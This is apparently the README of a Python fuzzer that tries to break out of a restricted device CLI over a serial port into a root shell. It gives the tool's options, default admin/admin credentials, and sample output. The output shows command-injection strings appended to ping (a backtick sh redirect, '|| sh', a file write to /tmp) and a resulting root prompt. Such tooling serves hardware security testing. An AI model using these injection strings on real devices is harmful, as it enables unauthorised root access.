# CLISerialFuzzer
Serial Connection CLI Command Jail Break Fuzzer.

## Features
* Configurable Serial Communications
* Auto-relogin detection
* Sudo Password detection
* Success-case detection
* Exception-case detection
* Easy to configure command payloads
* Customizable timing / delays
* Fuzz resuming based on test case numbers
* Time remaining estimate updates

## Installation
```

```

## Command Line Parameters
```
#python CLISerialFuzzer.py -h
Serial Connection CLI Command Jail Break Fuzzer : 1.0 Updated: May 4, 2018
usage: CLISerialFuzzer.py [-h] [-log LOG] [-testcase int]
                          [-clicommands CLICOMMANDS]
                          [-shellcommands SHELLCOMMANDS]
                          [-escapecharacters ESCAPECHARACTERS]
                          [-escapecharactercount int] [-addspace]
                          [-success1 SUCCESS1] [-success2 SUCCESS2]
                          [-success3 SUCCESS3] [-exception EXCEPTION]
                          [-error ERROR] [-relogin RELOGIN] [-sudo SUDO]
                          [-username USERNAME] [-password PASSWORD] [-com COM]
                          [-baud BAUD] [-readtimeout READTIMEOUT]
                          [-writetimeout WRITETIMEOUT]
                          [-interbytetimeout INTERBYTETIMEOUT]
                          [-parity PARITY] [-stopbits STOPBITS]
                          [-bytesize BYTESIZE] [-xonxoff XONXOFF]
                          [-rtscts RTSCTS] [-dsrdtr DSRDTR]

Created an ascii file filled with all combinations of HTML escape characters.

optional arguments:
  -h, --help            show this help message and exit
  -log LOG              filename to write log output
  -testcase int         The test case to resume from (default: 1)
  -clicommands CLICOMMANDS
                        file containing the cli commands to fuzz
  -shellcommands SHELLCOMMANDS
                        file containing the shell commands to test
  -escapecharacters ESCAPECHARACTERS
                        file containing hex codes for the escape characters to
                        append with CLI and shell commands
  -escapecharactercount int
                        The number of escape characters to combine (default: 1)
  -addspace             Add a space character between the cli command, the
                        escape character and the shell command.
  -success1 SUCCESS1    The string 1 to look for in output results that could
                        indicate a successful CLI jail break (default: :/#)
  -success2 SUCCESS2    The string 2 to look for in output results that could
                        indicate a successful CLI jail break (default: :~#)
  -success3 SUCCESS3    The string 3 to look for in output results that could
                        indicate a successful CLI jail break (default: root@)
  -exception EXCEPTION  The string to look for in output results that could
                        indicate an exception (default: Exception)
  -error ERROR          The string to look for in output results that could
                        indicate an error (default: Error)
  -relogin RELOGIN      The string to look for in output results that would
                        require the username and password to be entered
                        (default: login:)
  -sudo SUDO            The string to look for in output results that would
                        require the password to be reentered - like a sudo
                        (default: password:)
  -username USERNAME    The username to be used when a login prompt is
                        detected (default: admin)
  -password PASSWORD    The password to be used when a login prompt / sudo is
                        detected (default: admin)
  -com COM              The Serial COM port to use (default: COM5)
  -baud BAUD            The Serial BAUD rate to use (default: 115200)
  -readtimeout READTIMEOUT
                        The Serial read command timeout value to use (default: 0.1)
  -writetimeout WRITETIMEOUT
                        The Serial write command timeout value to use (default: 0.1)
  -interbytetimeout INTERBYTETIMEOUT
                        The Serial inter byte timeout value to use (default: 0.0)
  -parity PARITY        The Serial parity value to use. Expecting N =
                        PARITY_NONE, E = PARITY_EVEN, O = PARITY_ODD, M =
                        PARITY_MARK or S = PARITY_SPACE (default: N)
  -stopbits STOPBITS    The Serial stop bits value to use (default: 1)
  -bytesize BYTESIZE    The Serial byte size value to use (default: 8)
  -xonxoff XONXOFF      The Serial xonxoff flag value to use (default: 1)
  -rtscts RTSCTS        The Serial rtscts flag value to use (default: 0)
  -dsrdtr DSRDTR        The Serial dsrdtr flag value to use (default: 0)
```


## Output
```
Serial Connection CLI Command Jail Break Fuzzer : 1.0 Updated: May 3, 2018
Relogin String found from command (test case # 11): 
ping  127.0.0.1    `sh >> /dev/ttyp0`

Entering Username and Password...
Relogin String found from command (test case # 13): 
ping  127.0.0.1    sh

Entering Username and Password...
Relogin String found from command (test case # 35): 
ping  127.0.0.1    `sh >> /dev/ttyp0`

Entering Username and Password...
Error String found from command (test case # 36): 
ping  127.0.0.1    echo FREEDOM >> /tmp/imfree.txt

Success String found from command (test case # 42):
ping 127.0.0.1  || sh
Result Data:

root@busybox:~#

```
